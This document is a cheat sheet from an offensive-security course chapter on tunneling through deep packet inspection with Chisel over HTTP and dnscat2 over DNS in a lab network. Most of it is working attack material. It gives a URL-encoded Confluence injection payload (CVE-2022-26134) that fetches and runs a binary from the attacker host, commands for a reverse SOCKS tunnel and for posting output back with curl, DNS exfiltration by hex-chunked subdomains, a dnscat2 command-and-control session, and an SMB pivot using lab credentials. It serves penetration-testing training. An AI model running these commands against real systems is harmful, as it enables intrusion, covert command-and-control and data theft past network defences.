# Tunneling Through Deep Packet Inspection Cheat Sheet (PEN-200, Ch. 20)

**Deep Packet Inspection (DPI)**: monitors traffic against a rule set, usually at the network perimeter, to flag/block patterns indicative of compromise. DPI devices can restrict which transport protocols are allowed into, out of, or across a network (e.g. "block all outbound SSH" — which would kill SSH port redirection/tunneling techniques outright).

Two Learning Units in this chapter:
- HTTP Tunneling Theory and Practice (Chisel)
- DNS Tunneling Theory and Practice (raw DNS records, dnscat2)

Builds directly on the earlier *Port Redirection and SSH Tunneling* module — same pivoting goals, but assuming DPI has closed off everything except HTTP or DNS.

---

## 20.1 HTTP Tunneling Theory and Practice

### 20.1.1 HTTP tunneling fundamentals

**Scenario**: CONFLUENCE01 is compromised and gives command execution via HTTP requests (e.g. a vulnerable web app injection). A DPI solution now terminates all outbound traffic except HTTP, and all inbound ports on CONFLUENCE01 are blocked except TCP/8090. A normal reverse shell or SSH remote port forward won't survive the DPI filter — only HTTP-formatted traffic (Wget, cURL) gets through.

> This is a hypothetical scenario — no DPI is actually implemented in the exercise lab. Imagining the restriction is what drives building a robust, protocol-conforming tunneling strategy.

*Figure 277* depicts the network layout: a FIREWALL/INSPECTOR device sits on the WAN interface in front of CONFLUENCE01 (replacing the earlier simple firewall), performing DPI on the data stream; MULTISERVER03 is blocked from directly reaching CONFLUENCE01 across this device.

### 20.1.2 HTTP tunneling with Chisel

**Chisel**: client/server tunneling tool. A Chisel *server* accepts connections from a Chisel *client*; supports various port-forwarding modes, notably **reverse port forwarding** (conceptually like SSH remote port forwarding). Runs on macOS, Linux, and Windows across multiple architectures.

> Older tools like HTTPTunnel offer similar functionality but lack Chisel's flexibility and cross-platform support.

> If the target's OS/architecture differs from your Kali box, download the matching compiled binary from the Chisel GitHub releases page rather than assuming your local binary will run.

**Plan** (*Figure 278*): run a Chisel server on Kali that binds a SOCKS proxy port locally. The Chisel client on CONFLUENCE01 connects out to the server; the server encapsulates whatever hits the SOCKS port and pushes it through the tunnel to the client, which decapsulates and forwards it on. Traffic between client and server is entirely HTTP-formatted (an HTTP→WebSocket upgrade under the hood), so it satisfies the DPI's "HTTP only" rule.

**Serve the Chisel binary from Kali via Apache:**
```bash
kali@kali:~$ sudo cp $(which chisel) /var/www/html/
kali@kali:~$ sudo systemctl start apache2
```

**Build the download payload** to run through the CONFLUENCE01 injection (downloads chisel to `/tmp/chisel` and makes it executable):
```bash
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

Wrap it in the Confluence RCE injection (CVE-2022-26134, Nashorn `ScriptEngineManager` → `ProcessBuilder`). Reuse/edit an existing URL-encoded payload rather than rebuilding one from scratch:
```bash
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

Confirm the binary was fetched by tailing Apache's access log on Kali:
```bash
kali@kali:~$ tail -f /var/log/apache2/access.log
...
192.168.50.63 - - [03/Oct/2023:15:53:16 -0400] "GET /chisel HTTP/1.1" 200 8593795 "-" "Wget/1.20.3 (linux-gnu)"
```

**Start the Chisel server on Kali** with the bind port and reverse-tunneling flag:
```bash
kali@kali:~$ chisel server --port 8080 --reverse
2023/10/03 15:57:53 server: Reverse tunnelling enabled
2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080
```

**Watch for inbound traffic** before launching the client:
```bash
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
```

**Launch the Chisel client via the injection**, requesting a reverse SOCKS tunnel back to Kali:
```bash
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```
- `R:socks` = reverse tunnel using a SOCKS proxy, bound to port **1080** by default (on the *server*/Kali side).
- `> /dev/null 2>&1 &` = backgrounds the process so the injection request doesn't hang waiting for it to finish.

**Troubleshooting a silent failure** — if no traffic appears in tcpdump, capture the client's stdout/stderr and POST it back over HTTP so you can read the error:
```bash
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```
Injection payload for the above:
```bash
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/
```

The recovered output showed a **glibc version mismatch** (`/lib64/libc.so.6: version 'GLIBC_2.32' not found`, also `GLIBC_2.34` — neither present on CONFLUENCE01).

> Written in 2023 against Chisel 1.8.1-0kali2 (go1.20.7); newer Kali repo versions of Chisel may throw a different error message, but the underlying lesson — find/build a compatible payload when a tool is incompatible with the target OS — still applies.

Check the local Chisel build info:
```bash
kali@kali:~$ chisel -h
Usage: chisel [command] [--help]
Version: 1.8.1-0kali2 (go1.20.7)
Commands:
   server - runs chisel in server mode
   client - runs chisel in client mode
```

**Root cause**: the Kali-packaged Chisel binary was compiled with a Go toolchain that requires a newer glibc than CONFLUENCE01 has. **Fix**: fetch the official upstream release (built more portably) from the Chisel GitHub repo instead of the Kali package build:
```bash
kali@kali:~$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
kali@kali:~$ gunzip chisel_1.8.1_linux_amd64.gz
kali@kali:~$ sudo cp ./chisel /var/www/html
```

Re-run the same wget injection to overwrite `/tmp/chisel` on CONFLUENCE01:
```bash
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

Re-run the client injection (same as the `R:socks` command above). This time tcpdump on Kali captures a valid **HTTP→WebSocket upgrade handshake**:
```
GET / HTTP/1.1
Host: 192.168.118.4:8080
User-Agent: Go-http-client/1.1
Connection: Upgrade
Sec-WebSocket-Key: L8FCtL3MW18gHd/ccRWOPQ==
Sec-WebSocket-Protocol: chisel-v3
Sec-WebSocket-Version: 13
Upgrade: websocket
```

> Chisel's "HTTP tunnel" is literally an HTTP request that upgrades to a WebSocket connection — this is exactly why it slips past a DPI rule that only permits well-formed HTTP: the handshake itself is standard HTTP.

Confirm the SOCKS proxy is now listening locally on Kali:
```bash
kali@kali:~$ ss -ntplu
tcp   LISTEN  0  4096  127.0.0.1:1080  0.0.0.0:*  users:(("chisel",pid=501221,fd=8))
tcp   LISTEN  0  4096  *:8080          *:*        users:(("chisel",pid=501221,fd=6))
tcp   LISTEN  0  511   *:80            *:*
```
SOCKS proxy port 1080 is bound to the **loopback** interface only.

**Pivot SSH through the reverse SOCKS proxy.** SSH has no built-in generic SOCKS-proxy flag — use `ProxyCommand` instead (in a config file or via `-o`). The OpenBSD netcat's `-X` flag can proxy through SOCKS/HTTP, but Kali's netcat build doesn't support it — use **Ncat** (the Nmap project's netcat) instead:
```bash
kali@kali:~$ sudo apt install ncat
kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```
`%h` / `%p` = tokens SSH substitutes with the target host/port before running the `ProxyCommand`.

Result: a working SSH session to PGDATABASE01, tunneled entirely over HTTP through Chisel's reverse SOCKS proxy — using only HTTP-formatted traffic to/from CONFLUENCE01.

---

## 20.2 DNS Tunneling Theory and Practice

DNS is one of the internet's foundational protocols and has long been abused by attackers as a covert channel — e.g. to route traffic indirectly out of a network that otherwise blocks direct outbound connectivity. Before tunneling over DNS deliberately, it helps to understand a normal DNS transaction.

### 20.2.1 DNS tunneling fundamentals

**Normal DNS A-record resolution flow** (all over **UDP/53**):
1. Client asks its configured **recursive resolver** for the A record of `www.example.com`.
2. Resolver queries a **root name server** → gets referred to the `.com` **TLD name server**.
3. Resolver queries the TLD name server → gets referred to the **authoritative name server** for `example.com`.
4. Resolver queries the authoritative name server for the A record → gets the IPv4 address.
5. Resolver returns the answer to the client.

*Figure 279* illustrates this high-level recursive-resolution flow, using MULTISERVER03 as an example resolver (any public resolver, e.g. Google's `8.8.8.8`, works the same way).

**Lab scenario** (*Figure 280*): a new WAN host, **FELINEAUTHORITY**, sits alongside Kali — reachable from MULTISERVER03, CONFLUENCE01, and Kali, but *not* directly from PGDATABASE01 or HRSHARES. FELINEAUTHORITY is registered as the **authoritative name server for the `feline.corp` zone**. PGDATABASE01 uses MULTISERVER03 as its DNS resolver, so any query for `*.feline.corp` from PGDATABASE01 gets forwarded by MULTISERVER03 all the way to FELINEAUTHORITY — giving a one-way covert path even though PGDATABASE01 has no direct route there.

> In the real world you'd register the domain yourself, stand up the authoritative name server, and tell the registrar it's authoritative for the zone.

**Setup for the exercise:**
- Compromise CONFLUENCE01 (CVE-2022-26134) → reverse shell → SSH remote port forward → SSH into PGDATABASE01 as `database_admin`.
- SSH directly into FELINEAUTHORITY as `kali` / `7he_C4t_c0ntro11er` (it's on the WAN).

**Stand up Dnsmasq as a minimal authoritative DNS server** on FELINEAUTHORITY:
```bash
kali@felineauthority:~$ cd dns_tunneling
kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```
```bash
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
```
`-C` = config file, `-d` = "no-daemon" (foreground, easy to kill later). No records are configured yet, so any `feline.corp` query gets an `NXDOMAIN`.

**Check PGDATABASE01's DNS settings** (Ubuntu, systemd-resolved):
```bash
database_admin@pgdatabase01:~$ resolvectl status
...
Current DNS Server: 10.4.50.64
DNS Servers: 10.4.50.64
```
`10.4.50.64` = MULTISERVER03 — PGDATABASE01 can't reach FELINEAUTHORITY or Kali directly, only its resolver.

**Test exfiltration primitive** — query an arbitrary hostname under the zone:
```bash
database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
Server:   127.0.0.53
```
Response comes back as `NXDOMAIN` (expected — nothing configured for that name), but the **request itself still reached the authoritative server**, proving the covert channel works.

> `nslookup` first hits the local systemd-resolved cache/stub — flush it with `resolvectl flush-caches` if you get stale results, or query a specific server directly: `nslookup exfiltrated-data.feline.corp 192.168.50.64`.

Confirmed on FELINEAUTHORITY with tcpdump:
```bash
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)
04:57:40.721786 IP 192.168.118.4.domain > 192.168.50.64.65122: 26234 NXDomain 0/0/1 (57)
```
(*Figure 281* diagrams this flow: PGDATABASE01 → MULTISERVER03 → FELINEAUTHORITY, showing data reaching the authoritative server purely via DNS queries despite no direct route/connectivity.)

**Exfiltrating larger/binary data**: hex-encode the file, split the hex string into chunks, and send each chunk as a subdomain label in its own DNS request — `[hex-chunk].feline.corp`. Log every incoming request on the authoritative server and reassemble the hex chunks back into the original binary.

**Infiltration** (server → compromised host) uses **TXT records**, which hold arbitrary string data:
```bash
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```
```bash
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
```
(kill the previous dnsmasq process first — only one can bind UDP/53)
```bash
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:   192.168.50.64
Non-authoritative answer:
www.feline.corp text = "here's something useful!"
www.feline.corp text = "here's something else less useful."
```
Both configured TXT strings come back. For binary infiltration, Base64- or hex-encode the payload as TXT record content and decode it client-side.

### 20.2.2 DNS tunneling with dnscat2

**dnscat2** is a full framework built on these primitives: exfiltrates via DNS subdomain queries, infiltrates via TXT (and other) records, and multiplexes an encrypted C2/tunnel session over DNS. A dnscat2 **server** runs on the authoritative name server for a domain; **clients** run on compromised hosts and are configured to query that domain.

Kill Dnsmasq first (frees UDP/53), then start capturing and launch the server:
```bash
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
kali@felineauthority:~$ sudo dnscat2-server feline.corp
auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

   ./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp

To talk directly to the server without a domain name, run:

./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7
```

**Run the client on PGDATABASE01** (binary already staged; could also be `scp`'d over the existing SSH pivot):
```bash
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
domain = feline.corp
host = 0.0.0.0
port = 53
type = TXT,CNAME,MX
server = 127.0.0.53

Encrypted session established!
```

> **"Chicken or the egg" note**: DNS tunneling needs a way to get the client binary onto the target and execute it in the first place. Exfiltration/tunneling is just a *data-transfer* tool — it must be paired with a separate exploitation vector that already grants access.

Without a pre-shared `--secret`, dnscat2 can't cryptographically validate the far end — it's encrypted but not authenticated. Both ends print a matching verification phrase; compare them manually to rule out a MITM:
```
>> Annoy Mona Spiced Outran Stump Visas
```
Server side confirms the same:
```
dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:
>> Annoy Mona Spiced Outran Stump Visas
```

tcpdump on FELINEAUTHORITY shows the tunnel rotating through multiple DNS record types (TXT, CNAME, MX) for its underlying queries — spreading requests across query types rather than relying on one, e.g.:
```
07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX? 8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
07:22:17.762124 IP 192.168.50.64.49720 > 192.168.118.4.domain: 51139+ [1au] TXT? 49660140b6509f242f870119c47da533b7.feline.corp. (75)
```

**Interact with the session** from the dnscat2 console:
```bash
dnscat2> windows
0 :: main [active]
   crypto-debug :: Debug window for crypto stuff [*]
   dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
   1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
dnscat2> window -i 1
command (pgdatabase01) 1> ?
```

Available session commands (`-h`/`--help` on any of them for details):

| Command | Command | Command |
|---|---|---|
| clear | delay | download |
| echo | exec | help |
| listen | ping | quit |
| set | shell | shutdown |
| suspend | tunnels | unset |
| upload | window | windows |

**`listen`** operates like `ssh -L` — local port forward through the DNS tunnel:
```
listen [<lhost>:]<lport> <rhost>:<rport>
```

**Pivot to SMB on HRSHARES** (unreachable directly) by forwarding a local port on FELINEAUTHORITY to HRSHARES' SMB port, entirely through the DNS tunnel:
```bash
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
```
From another shell on FELINEAUTHORITY, connect through the forwarded port:
```bash
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
Sharename    Type  Comment
---------    ----  -------
ADMIN$       Disk  Remote Admin
C$           Disk  Default share
IPC$         IPC   Remote IPC
scripts      Disk
Users        Disk
```

The share listing succeeds, though noticeably slower than a direct connection — expected, since full TCP-based SMB traffic is being encapsulated inside DNS queries/responses carried over UDP, hopping PGDATABASE01 → MULTISERVER03 → FELINEAUTHORITY → HRSHARES. Despite PGDATABASE01 and HRSHARES having no direct route to each other or to FELINEAUTHORITY, DNS tunneling still delivered full SMB connectivity — DNS tunneling trades speed/overhead for reach when it's the only egress channel DPI leaves open.

---

## Key Takeaways / Workflow Summary

1. **Identify what DPI actually allows.** If only HTTP survives outbound, and only one inbound port survives, plan tooling around those two constraints specifically — don't default to SSH tunneling assumptions from earlier modules.
2. **HTTP tunnel via Chisel**:
   - Serve the matching-OS/arch Chisel binary over your existing web server (Apache).
   - `chisel server --port <port> --reverse` on Kali → binds a SOCKS proxy (default 1080, loopback-only) once a client connects.
   - `chisel client <kali>:<port> R:socks &` from the target — reverse SOCKS tunnel, HTTP/WebSocket-formatted end to end.
   - If the client won't connect, capture stdout/stderr to a file and `curl --data @file` it back over HTTP to read the error — a generic technique for command-injection foothold debugging.
   - Version mismatches (glibc vs. Go toolchain) are common with Kali-packaged Go binaries — grab the upstream GitHub release instead.
   - Chain non-SOCKS-native tools like SSH through the resulting SOCKS proxy with `-o ProxyCommand='ncat --proxy-type socks5 --proxy <host>:<port> %h %p'` (Ncat, not Kali's netcat, for `-X`/proxy support).
3. **DNS tunnel fundamentals**: any query for a name under a domain you control as authoritative NS reaches your server even with zero direct connectivity — a one-way covert channel out of the box. Exfiltrate via subdomain labels (hex-chunked), infiltrate via TXT records (Base64/hex-encoded for binary data). Dnsmasq (`auth-zone`/`auth-server`, `txt-record=`) is enough to prototype this manually.
4. **dnscat2** productizes DNS tunneling into a full encrypted C2 channel: server on the authoritative NS, client on the compromised host, `listen` for local port forwards (`ssh -L` equivalent) to reach otherwise-unroutable internal hosts (e.g. SMB on HRSHARES).
5. Always pair a tunneling/exfiltration technique with the initial exploitation vector that got you execution in the first place — tunneling tools move data, they don't get you a foothold on their own.
6. Expect **DNS tunnels to be slow** (TCP-over-UDP-over-DNS-query encapsulation) — use them when nothing faster survives the DPI/firewall, not as a default.
